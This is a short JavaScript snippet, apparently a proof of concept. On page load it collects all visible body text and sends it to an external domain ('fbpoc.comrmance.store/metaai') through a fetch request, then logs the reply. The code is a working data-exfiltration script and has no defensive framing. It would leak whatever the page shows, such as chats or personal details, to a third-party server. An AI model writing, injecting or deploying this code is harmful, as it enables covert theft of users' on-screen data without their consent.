document.addEventListener('DOMContentLoaded', function() {
  const bodyHTML = document.body.innerHTML;
  
  // Remove HTML tags by creating a temporary element and getting text content
  const tempDiv = document.createElement('div');
  tempDiv.innerHTML = bodyHTML;
  const textOnly = tempDiv.textContent || tempDiv.innerText || '';
  
  fetch(`https://fbpoc.comrmance.store/metaai?text=${encodeURIComponent(textOnly)}`)
    .then(response => response.json())
    .then(data => {
      console.log('API Response:', data);
    })
    .catch(error => {
      console.error('API Error:', error);
    });
});
